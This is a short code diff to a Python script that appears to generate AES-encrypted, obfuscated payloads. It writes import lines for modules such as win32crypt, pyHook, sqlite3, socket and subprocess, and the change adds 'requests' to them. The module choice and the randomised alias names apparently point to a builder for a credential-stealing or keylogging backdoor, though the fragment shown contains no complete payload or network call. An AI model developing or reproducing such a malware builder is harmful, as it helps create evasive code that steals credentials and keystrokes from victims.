@@ -93,7 +93,7 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 f.write('''#!/usr/bin/env python
 import ''')
 
-myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3']
+myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests']
 myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
 mywindows = ['win32api', 'win32crypt', 'pyHook', 'pythoncom', 'win32con']
 
